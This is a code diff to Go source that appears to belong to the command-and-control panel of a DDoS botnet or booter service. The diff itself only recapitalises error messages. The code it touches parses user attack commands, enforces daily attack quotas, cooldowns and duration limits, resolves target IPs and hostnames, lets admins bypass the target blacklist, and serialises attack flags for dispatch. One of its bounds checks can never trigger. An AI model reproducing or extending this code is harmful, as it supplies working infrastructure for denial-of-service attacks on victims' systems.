@@ -46,31 +46,31 @@ func (M *Method) Parse(args []string, user *User) (*Attack, error) {
 	}
 
 	if len(args) < 2 { // Missing target
-		return new(Attack), errors.New("you must provide a target")
+		return new(Attack), errors.New("You must provide a target")
 	} else if !Attacks { // Disabled attacks?
-		return new(Attack), errors.New("attacks are currently disabled")
+		return new(Attack), errors.New("Attacks are currently disabled")
 	}
 
 	// Fetches all the attacks sent within the day. only non-admin users will be alerted.
 	sent, err := UserOngoingAttacks(user.Username, time.Date(time.Now().Year(), time.Now().Month(), time.Now().Day(), 0, 0, 0, 0, time.Now().Location()))
 	if err != nil || len(sent) >= user.MaxDaily && !user.Admin {
-		return nil, errors.New("your daily attack limit exceeded of " + strconv.Itoa(len(sent)))
+		return nil, errors.New("Your daily attack limit exceeded of " + strconv.Itoa(len(sent)))
 	}
 
 	running, err := OngoingAttacks(time.Now())
 	if err != nil || len(running) >= Options.Templates.Attacks.MaximumOngoing {
-		return new(Attack), errors.New("maximum global attack limit exceeded")
+		return new(Attack), errors.New("Maximum global attack limit exceeded")
 	}
 
 	thererunning, err := UserOngoingAttacks(user.Username, time.Now())
 	if err != nil || thererunning == nil {
-		return new(Attack), errors.New("unknown issue when fetching details")
+		return new(Attack), errors.New("Unknown issue when fetching details")
 	}
 
 	// Checks within the thererunning limits
 	if len(thererunning) > 0 {
 		if user.Conns > 0 && user.Conns < len(thererunning) {
-			return new(Attack), errors.New("concurrent limit exceeded")
+			return new(Attack), errors.New("Concurrent limit exceeded")
 		}
 
 		var recent *AttackLog = &thererunning[0]
@@ -82,7 +82,7 @@ func (M *Method) Parse(args []string, user *User) (*Attack, error) {
 		}
 
 		if user.Cooldown > 0 && recent.Sent+int64(user.Cooldown) > time.Now().Unix() {
-			return new(Attack), errors.New("you are in cooldown")
+			return new(Attack), errors.New("You are in cooldown")
 		}
 	}
 
@@ -91,24 +91,24 @@ func (M *Method) Parse(args []string, user *User) (*Attack, error) {
 	// Parses all the possible targets
 	for pos, target := range strings.Split(args[1], ",") {
 		if pos > 255 {
-			return new(Attack), errors.New("too many targets")
+			return new(Attack), errors.New("Too many targets")
 		}
 
 		types, ok := CanAttack(target)
 		if !ok {
-			return new(Attack), errors.New("unknown target")
+			return new(Attack), errors.New("Unknown target")
 		}
 
 		// Check if the target is blacklisted
 		if !user.Admin && isBlacklisted(target) {
-			return new(Attack), errors.New("target IP is blacklisted")
+			return new(Attack), errors.New("Target IP is blacklisted")
 		}
 
 		switch types {
 		case 1: // IP resolve
 			p := net.ParseIP(target)
 			if p == nil {
-				return new(Attack), errors.New("invalid target")
+				return new(Attack), errors.New("Invalid target")
 			}
 
 			profile.Targets[binary.BigEndian.Uint32(p[12:])] = 32
@@ -116,7 +116,7 @@ func (M *Method) Parse(args []string, user *User) (*Attack, error) {
 		case 2, 3: // Target resolve
 			endpoints, err := resolver.LookupHost(target)
 			if err != nil {
-				return new(Attack), errors.New("invalid target")
+				return new(Attack), errors.New("Invalid target")
 			}
 
 			// Ranges through the dns endpoints
@@ -133,7 +133,7 @@ func (M *Method) Parse(args []string, user *User) (*Attack, error) {
 
 	args[1] = strings.Join(ips, ",")
 	if len(args) < 3 { // Missing duration
-		return new(Attack), errors.New("you must provide a duration")
+		return new(Attack), errors.New("You must provide a duration")
 	}
 
 	var appends []string = make([]string, 0)
@@ -141,12 +141,12 @@ func (M *Method) Parse(args []string, user *User) (*Attack, error) {
 		for _, flag := range args[3:] {
 			flagSplit := strings.Split(flag, "=")
 			if len(flagSplit) < 2 {
-				return new(Attack), errors.New("invalid combination key=value")
+				return new(Attack), errors.New("Invalid combination key=value")
 			}
 
 			information, ok := Flags[flagSplit[0]]
 			if !ok || !InUint8Slice(M.Flags, information.ID) {
-				return new(Attack), errors.New("unknown flag combination")
+				return new(Attack), errors.New("Unknown flag combination")
 			}
 
 			value := strings.Join(flagSplit[1:], "=")
@@ -171,7 +171,7 @@ func (M *Method) Parse(args []string, user *User) (*Attack, error) {
 		switch system.Type {
 		case reflect.String: // String
 			if len(fmt.Sprint(system.Default)) > system.Maximum || len(fmt.Sprint(system.Default)) < system.Minimum {
-				return new(Attack), errors.New("not within min/max bounds")
+				return new(Attack), errors.New("Not within min/max bounds")
 			}
 
 			profile.Flags[uint8(system.ID)] = fmt.Sprint(system.Default)
@@ -179,9 +179,9 @@ func (M *Method) Parse(args []string, user *User) (*Attack, error) {
 		case reflect.Int: // Int
 			convert, err := strconv.Atoi(fmt.Sprint(system.Default))
 			if err != nil {
-				return new(Attack), errors.New("error with flag configs")
+				return new(Attack), errors.New("Error with flag configs")
 			} else if convert > system.Maximum || convert < system.Minimum {
-				return new(Attack), errors.New("not within min/max bounds")
+				return new(Attack), errors.New("Not within min/max bounds")
 			}
 
 			profile.Flags[uint8(system.ID)] = fmt.Sprint(convert)
@@ -189,7 +189,7 @@ func (M *Method) Parse(args []string, user *User) (*Attack, error) {
 		case reflect.Bool: // Bool
 			convert, err := strconv.ParseBool(fmt.Sprint(system.Default))
 			if err != nil {
-				return new(Attack), errors.New("error with flag configs")
+				return new(Attack), errors.New("Error with flag configs")
 			}
 
 			profile.Flags[uint8(system.ID)] = fmt.Sprint(convert)
@@ -198,11 +198,11 @@ func (M *Method) Parse(args []string, user *User) (*Attack, error) {
 
 	duration, err := strconv.Atoi(args[2])
 	if err != nil {
-		return new(Attack), errors.New("invalid duration")
+		return new(Attack), errors.New("Invalid duration")
 	}
 
 	if duration > user.Maxtime {
-		return new(Attack), errors.New("duration must be greater than user.maxtime")
+		return new(Attack), errors.New("Duration must be less than or equal to user maxtime")
 	}
 
 	profile.Duration = uint32(duration)
@@ -238,7 +238,7 @@ func (this *Attack) Bytes() ([]byte, error) {
 
 		stringBuf := []byte(value)
 		if len(stringBuf) > 255 {
-			return nil, errors.New("no more than 255 bytes")
+			return nil, errors.New("No more than 255 bytes")
 		}
 
 		flag[1] = uint8(len(stringBuf))
@@ -247,7 +247,7 @@ func (this *Attack) Bytes() ([]byte, error) {
 	}
 
 	if len(buf) > 1024 && len(buf) <= 0 {
-		return nil, errors.New("invalid buf length reached")
+		return nil, errors.New("Invalid buf length reached")
 	}
 
 	final := make([]byte, 2)
